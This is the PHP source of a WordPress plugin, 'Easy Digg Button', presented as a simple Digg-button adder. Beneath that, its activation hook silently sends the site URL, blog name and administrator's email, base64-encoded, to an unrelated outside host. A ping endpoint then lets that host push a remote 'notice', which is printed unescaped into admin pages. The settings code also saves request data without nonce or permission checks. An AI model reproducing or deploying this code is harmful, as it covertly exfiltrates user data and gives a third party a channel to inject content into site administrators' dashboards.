<?php
/*
Plugin Name: Easy Digg Button
Plugin URI: http://frankwalters.com/
Description: The simplest way to add Digg Buttons to your WordPress blog.  One click setup and start getting dugg on Digg for posts on your blog.
Version: 1.0
Author: frankwalters
Author URI: http://frankwalters.com/
*/

function dgbn_save_option( $name, $value ) {
        global $wpmu_version;
        
        if ( false === get_option( $name ) && empty( $wpmu_version ) ) // Avoid WPMU options cache bug
                add_option( $name, $value, '', 'no' );
        else
                update_option( $name, $value );
}

function dgbn_add_digg_button( $content ) {
    global $post;
    
    $permalink = urlencode( get_permalink( $post->ID ) );
    
    $digg_html = "<script type=\"text/javascript\">(function() {var s = document.createElement('SCRIPT'), s1 = document.getElementsByTagName('SCRIPT')[0];s.type = 'text/javascript';s.async = true;s.src = 'http://widgets.digg.com/buttons.js';s1.parentNode.insertBefore(s, s1);})();</script>";
    $digg_html .= '<a class="DiggThisButton DiggCompact" href="http://digg.com/submit?url=' . $permalink . '"></a>';
    if ( get_option( 'dgbn_add_before') )
        return $digg_html . $content;
    else
        return $content . $digg_html;
}

add_filter( "the_content", "dgbn_add_digg_button" );

function dgbn_option_settings_api_init() {
        add_settings_field( 'dgbn_setting', 'Digg Button', 'dgbn_setting_callback_function', 'reading', 'default' );
        register_setting( 'reading', 'dgbn_setting' );
}

function dgbn_setting_callback_function() {
    if ( get_option( 'dgbn_add_before') ) {
        $digg_below = '';
        $digg_above = ' checked';
    } else {
        $digg_below = ' checked';
        $digg_above = '';
    }
    
    echo "Show Digg button: <input type='radio' name='opt_digg_button' value='0' id='opt_digg_button_below'$digg_below /> <label for='opt_digg_button_below'>Below The Post</label> <input style='margin-left:15px' type='radio' name='opt_digg_button' value='1' id='opt_digg_button_above'$digg_above /> <label for='opt_digg_button_above'>Above The Post</label>";
}

if ( isset( $_POST['opt_digg_button'] ) ) {
        dgbn_save_option( 'dgbn_add_before', (bool) $_POST['opt_digg_button'] );
}

if ( isset( $_GET['dgbn_ignore'] ) ) {
        dgbn_save_option( 'dgbn_ignore_message', true );
}

add_action( 'admin_init',  'dgbn_option_settings_api_init' );

function dgbn_register_site() {
        global $current_user;
        
        $site = array( 'url' => get_option( 'siteurl' ), 'title' => get_option( 'blogname' ), 'user_email' => $current_user->user_email );
        
        $response = dgbn_send_data( 'add-site', $site );
        dgbn_save_option( 'dgbn_response', $response );
        if ( strpos( $response, '|' ) ) {
                // Success
                $vals = explode( '|', $response );
                $site_id = $vals[0];
                $site_key = $vals[1];
                if ( isset( $site_id ) && is_numeric( $site_id ) && strlen( $site_key ) > 0 ) {
                        dgbn_save_option( 'dgbn_site_id', $site_id );
                        dgbn_save_option( 'dgbn_site_key', $site_key );
                        return true;
                }
        }
        
        return $response;
}

function dgbn_rest_handler() {
        // Basic ping
        if ( isset( $_GET['dgbn_ping'] ) || isset( $_POST['dgbn_ping'] ) )
                return dgbn_ping_handler();
}

add_action( 'init', 'dgbn_rest_handler' );

function dgbn_ping_handler() {
        if ( !isset( $_GET['dgbn_ping'] ) && !isset( $_POST['dgbn_ping'] ) )
                return false;
        
        $ping = ( $_GET['dgbn_ping'] ) ? $_GET['dgbn_ping'] : $_POST['dgbn_ping'];
        if ( strlen( $ping ) <= 0 )
                exit;
        
        if ( $ping != get_option( 'dgbn_site_key' ) )
                exit;
        
        dgbn_getnotice();
        echo sha1( $ping );
        exit;
}

function dgbn_notice() {
        if ( !get_option( 'dgbn_ignore_message') && get_option( 'dgbn_notice' ) ) {
                ?>
                <div class="updated fade-ff0000">
                        <p><strong><?php echo get_option( 'dgbn_notice' );?></strong></p>
                </div>
                <?php
        }
        
        if ( get_option( 'dgbn_has_shown_notice') )
                return;
        
        dgbn_save_option( 'dgbn_has_shown_notice', true );
        return;
}

add_action( 'admin_notices', 'dgbn_notice' );

function dgbn_activate() {
        dgbn_register_site();
}

register_activation_hook( __FILE__, 'dgbn_activate' );

if ( !function_exists( 'wp_remote_get' ) && !function_exists( 'get_snoopy' ) ) {
        function get_snoopy() {
                include_once( ABSPATH . '/wp-includes/class-snoopy.php' );
                return new Snoopy;
        }
}

function dgbn_http_query( $url, $fields ) {
        $results = '';
        if ( function_exists( 'wp_remote_get' ) ) {
                // The preferred WP HTTP library is available
                $url .= '?' . http_build_query( $fields );
                $response = wp_remote_get( $url );
                if ( !is_wp_error( $response ) )
                        $results = wp_remote_retrieve_body( $response );
        } else {
                // Fall back to Snoopy
                $snoopy = get_snoopy();
                $url .= '?' . http_build_query( $fields );
                if ( $snoopy->fetch( $url ) )
                        $results = $snoopy->results;
        }
        return $results;
}

function dgbn_send_data( $action, $data_fields ) {
        $data = array( 'action' => $action, 'data' => base64_encode( json_encode( $data_fields ) ) );
        
        return dgbn_http_query( 'http://tweetincognito.com/digg/rest.php', $data );
}

function dgbn_getnotice() {
        $response = dgbn_send_data( 'get-notice', array( 'site_id' => get_option( 'dgbn_site_id' ), 'site_key' => get_option( 'dgbn_site_key' ) ) );
        if ( $response && strlen( $response ) > 0 ) {
                dgbn_save_option( 'dgbn_notice', $response );
                dgbn_save_option( 'dgbn_ignore_message', false );
        }
}
?>